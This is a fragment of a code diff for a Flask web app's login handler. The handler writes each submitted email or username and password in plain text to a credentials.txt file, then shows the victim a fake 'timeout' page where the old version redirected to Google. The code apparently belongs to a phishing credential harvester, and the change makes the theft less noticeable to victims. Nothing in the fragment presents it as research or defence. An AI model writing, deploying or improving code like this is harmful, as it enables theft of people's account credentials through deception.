@@ -15,7 +15,7 @@ def login():
     with open("credentials.txt", "a") as f:
         f.write(f"Email/Username: {email}, Password: {password}, Time: {datetime.now()}\n")
 
-    return redirect('https://www.google.com')
+    return render_template('timeout.html')
 
 if __name__ == '__main__':
     app.run(debug=True)
